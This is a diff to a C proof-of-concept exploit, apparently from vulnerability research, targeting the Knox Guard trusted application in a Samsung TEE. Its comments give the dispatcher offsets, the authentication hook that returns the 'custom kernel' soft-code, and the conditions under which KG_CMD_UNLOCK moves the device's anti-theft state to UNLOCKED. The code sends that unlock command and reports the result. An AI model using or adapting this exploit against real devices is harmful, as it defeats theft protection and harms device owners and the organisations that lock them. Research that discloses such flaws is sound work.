@@ -35,26 +35,32 @@
  *   One call, one state transition, no recovery from the device side
  *   (knxgud.md lines 288-309 "Exploit chain" / "Why worse than VLTKPR").
  *
- * GATE / REPRO-STATUS: DEVICE-ONLY (PROCA). Per emulation/knxgud.md lines
- *   83-137, TA_InvokeCommandEntryPoint halts in its PROCA prelude at the
- *   un-modeled TEE_OpenTASession (TA→PROCA, UUID …0050524f4341) BEFORE
- *   process_cmd. The emulator's default_func HALTS rather than *returning* the
- *   1179648/1114137 soft-code the dispatcher's fall-through keys on, so the bug
- *   cannot be driven in-emulator as-is. The established in-emulator soft-pass is
- *   the `vltkpr_authenticate_ca_softpass` pattern: a .json inline hook that
- *   stubs the TA's authenticate routine to return the pass value so the
- *   dispatch is reached (vltkpr_verifycert/jni/poc.c lines 19-26; hook lives in
- *   tas/00000000-0000-0000-0000-564c544b5052.json). For knxgud the analogue is
- *   an inline hook on kg_proca_authenticate (@0x23B54) returning a soft-code
- *   (1179648 or 1114137) so the dispatcher falls through to process_cmd.
- *   Even past that, the handler path further needs an un-modeled GCM unwrap
- *   (EVP_aes_256_gcm / EVP_DecryptUpdate for tz_unwrap_data_with_derived_key)
- *   and a provisioned RPMB info-object (rot_check magic 0xEA030000) +
- *   TEES_RPMBWrite — same triple-prerequisite block class as engmod #2 /
- *   FbCkmR / duldar (emulation/knxgud.md lines 117-137). Hence: CONFIRMED-IN-
- *   BINARY + dynamic BLOCKED — this PoC documents the exact wire that fires the
- *   bypass on a real custom-kernel device; the emulator hosts the
- *   soft-pass condition but cannot return the soft-code.
+ * GATE / REPRO-STATUS: PROCA gate BYPASSED in-emulator (2026-06-14) + residual
+ *   provisioning gate. knxgud authenticates the caller through the
+ *   /dev/pa_driver PROCA ioctl, NOT TEE_OpenTASession: the InvokeCommand
+ *   dispatcher calls kg_proca_authenticate (S9BYH2 corpus build @0x2274c; the
+ *   RE-writeup build's @0x23B54 differs) and waives (log-and-continue -> runs
+ *   process_cmd) when it returns 0 / 0x120000 ("no PROCA") / 0x110019
+ *   ("custom kernel") — the CMPs are at dispatcher 0x1edc4/0x1edc8/0x1edd8.
+ *   The fresh emulator has no PROCA peer, so the unmodelled ioctl yields a zero
+ *   verdict PaTzAuthenticateWithRules cannot decode -> knxgud's own 100006 ->
+ *   TEE_ERROR_ACCESS_DENIED (0xffff0001), pre-dispatch. The emulator IS the
+ *   PROCA-stripped / custom-kernel condition the bug needs, so the documented
+ *   waiver is modeled directly via the established inline-hook pattern (cf.
+ *   vltkpr_authenticate_ca_softpass): teegris_api.knxgud_proca_authenticate_softpass
+ *   returns 0x110019, wired in tas/...6b6e78677564.json "inline" @0x2274c.
+ *   WITH the hook: session opens, dispatcher reaches process_cmd() -> KG unlock
+ *   (CONFIRMED — TA log "KG_TA : process_cmd()" / "KG_TA : KG unlock", and the
+ *   InvokeCommand return flips 0xffff0001 -> 0x0). The remaining prerequisite to
+ *   a full state->2 unlock is a PROVISIONED Knox-Guard secure-data object in
+ *   RPMB (present on a real enrolled device, absent here): kg_unlock then bails
+ *   "wrap data length is 0 ... failed to read wrap data". The emulator's
+ *   libscrypto GCM is now modeled (EVP_aes_256_gcm/DecryptUpdate hooks present),
+ *   so the GCM unwrap is no longer a blocker — only the provisioned store is.
+ *   Set TAEMU_PROCA_HARD=1 to disable the soft-pass and observe the native
+ *   ACCESS_DENIED. Net: PROCA caller-binding bypass = CONFIRMED dynamically;
+ *   full unlock = needs a real enrolled device's provisioned RPMB (not fabricated
+ *   — modelling documented gates only, never inventing device state).
  *
  * SECONDARY (MED): cert-purpose confusion in kg_provision_cert (cmd 0x117) —
  *   all four cert slots (enroll/bl/hotp/policy) chain-verify against the SAME
@@ -147,14 +153,31 @@ int main(void)
     res = TEEC_InvokeCommand_impl(&session, KG_CMD_UNLOCK, &op, &err_origin);
     printf("[*] KG_UNLOCK returned 0x%x (%d) origin 0x%x\n", res, (int)res, err_origin);
 
-    /* On a real custom-kernel device that fires the PROCA soft-pass, success
-     * means state has transitioned to 2 (UNLOCKED). The response header carries
-     * cmd_id|0x80000000 = 0x8000010A. In-emulator the call HALTS in the PROCA
-     * prelude (see top comment, GATE) so we don't reach this state. */
+    /* Reporting — kept honest about emulator vs real-device outcome.
+     * The response header carries cmd_id|0x80000000 = 0x8000010A. On a real
+     * custom-kernel ENROLLED device (the attack target: PROCA disabled by the
+     * custom kernel, Knox Guard previously enrolled so kg_secure_data exists in
+     * RPMB), res==0 means kg_unlock ran past the PROCA gate, unwrapped
+     * kg_secure_data and flipped state->2 (UNLOCKED).
+     *
+     * In the bundled emulator with the knxgud_proca_authenticate_softpass inline
+     * hook (tas/...6b6e78677564.json -> teegris_api.py @0x2274c), the PROCA gate
+     * is bypassed and the dispatcher REACHES process_cmd()/KG unlock (this is the
+     * confirmable part — see the TA log: "KG_TA : process_cmd()" then
+     * "KG_TA : KG unlock"). The fresh emulator has NO provisioned Knox-Guard
+     * secure-data, so kg_unlock then bails at "wrap data length is 0 ... failed
+     * to read wrap data" and the state->2 write does not occur. So res==0 here
+     * proves the PROCA BYPASS (handler reached), NOT a completed unlock; the
+     * REE side cannot see the internal bail, so we do not assert UNLOCKED. */
     if (res == TEEC_SUCCESS) {
         uint32_t rsp_hdr = *(uint32_t*)(out + 0);
         printf("[*] response header = 0x%08x (expect 0x8000010A = cmd|response-bit)\n", rsp_hdr);
-        printf("[*] >>> Knox Guard state -> 2 (UNLOCKED). Anti-theft lock defeated.\n");
+        printf("[*] PROCA gate PASSED: dispatcher reached process_cmd()/kg_unlock.\n");
+        printf("[*] On a real enrolled custom-kernel device this transitions state -> 2 (UNLOCKED).\n");
+        printf("[*] In the fresh emulator, kg_unlock bails on the empty kg_secure_data store\n");
+        printf("[*]   (TA log: 'wrap data length is 0'); provisioned RPMB is the remaining prerequisite.\n");
+    } else if ((res & 0xffff0000u) == 0xffff0000u) {
+        printf("[*] (PROCA gate DENIED -> 0x%x; run with the knxgud_proca_authenticate_softpass hook to bypass)\n", res);
     }
 
     TEEC_CloseSession_impl(&session);
